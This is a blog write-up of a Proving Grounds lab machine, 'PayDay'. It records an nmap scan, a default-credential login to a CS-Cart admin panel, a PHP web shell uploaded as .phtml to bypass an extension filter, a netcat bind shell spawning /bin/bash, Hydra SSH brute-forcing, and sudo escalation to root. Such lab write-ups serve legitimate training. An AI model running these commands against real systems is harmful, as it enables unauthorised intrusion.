---
layout: post
title: PG | PayDay
subtitle: Things normally go smooth on payday.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 15:27 UTC
Nmap scan report for 192.168.182.39
Host is up (0.017s latency).
Not shown: 65527 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2023-10-29T15:28:08+00:00; +7s from scanner time.
|_pop3-capabilities: STLS PIPELINING CAPA SASL UIDL RESP-CODES TOP
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_ssl-date: 2023-10-29T15:28:08+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_imap-capabilities: IMAP4rev1 completed IDLE LOGIN-REFERRALS LITERAL+ THREAD=REFERENCES SASL-IR OK Capability LOGINDISABLEDA0001 STARTTLS NAMESPACE UNSELECT CHILDREN SORT MULTIAPPEND
V      Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_ssl-date: 2023-10-29T15:28:08+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_imap-capabilities: IMAP4rev1 IDLE LOGIN-REFERRALS LITERAL+ THREAD=REFERENCES SASL-IR OK completed Capability AUTH=PLAINA0001 NAMESPACE UNSELECT CHILDREN SORT MULTIAPPEND
995/tcp open  ssl/pop3    Dovecot pop3d
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_pop3-capabilities: SASL(PLAIN) PIPELINING CAPA USER UIDL RESP-CODES TOP
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2023-10-29T15:28:08+00:00; +8s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2023-10-29T11:28:05-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 40m07s, deviation: 1h38m00s, median: 6s
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.40 seconds
~~~

## HTTP (TCP/80)

The web server on port 80 is hosting a CS-Cart webpage

![PayDay](/assets/img/PayDayPG(1).png)

I started enumeration by running a gobuster sub-directory scan and found a /admin.php page

![PayDay](/assets/img/PayDayPG(2).png)

I tried using the default credentials of admin:admin and it worked!

![PayDay](/assets/img/PayDayPG(3).png)

After navigating the admin panel I found a upload file option that saves the file locally on the target host and is displayed on the website via the 'Current path: /skins/'

At first I attempted to upload a PHP web shell file but the .php extension was blacklisted, I changed the shell extension to .phtml which is compatible with running php code

![PayDay](/assets/img/PayDayPG(7).png)

![PayDay](/assets/img/PayDayPG(4).png)

I then ran an 'id' command at http://192.168.182.39/skins/shell.phtml to test the web shell and it succeeded!

![PayDay](/assets/img/PayDayPG(5).png)

To get a stable shell I created a netcat listener on the target via the web shell

~~~shell
http://192.168.182.39/skins/shell.phtml?cmd=nc%20-nvlp%204444%20-e%20/bin/bash
~~~

Then connected to the listener via my attack host

~~~shell
┌──(kali㉿kali)-[~/Desktop/PayDay]
└─$ nc -nv 192.168.182.39 4444
(UNKNOWN) [192.168.182.39] 4444 (?) open
whoami
www-data
python -c 'import pty; pty.spawn("/bin/sh")'
$ 
~~~

I ran a bruteforce via SSH on the user account 'patrick' using Hydra and found valid credentials of patrick:patrick

The server uses legacy SSH key algorithms ssh-rsa and ssh-dss so you may need to enable [SSH Wide Compatibility Mode](https://www.youtube.com/watch?v=fKVLVNaVXF0) to run the Hydra brute force

~~~shell
┌──(kali㉿kali)-[~/Desktop/PayDay]
└─$ hydra -f -l patrick -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://192.168.182.39 -t 10
~~~

![PayDay](/assets/img/PayDayPG(6).png)

~~~shell
┌──(kali㉿kali)-[~/Desktop/PayDay]
└─$ ssh patrick@192.168.182.39                                                                                                                         
The authenticity of host '192.168.182.39 (192.168.182.39)' can't be established.
DSA key fingerprint is SHA256:UtI16p2JU9a/SuF1RZ3eUAYqCLBtgOewIPtIdm7kNNA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.182.39' (DSA) to the list of known hosts.
patrick@192.168.182.39's password: 
Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
patrick@payday:~$ 

I checked what privileges the patrick user has and it had full sudo rights!

patrick@payday:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL
~~~

I finished by upgrading the shell to root

~~~shell
patrick@payday:~$ sudo su
root@payday:/home/patrick# whoami
root
~~~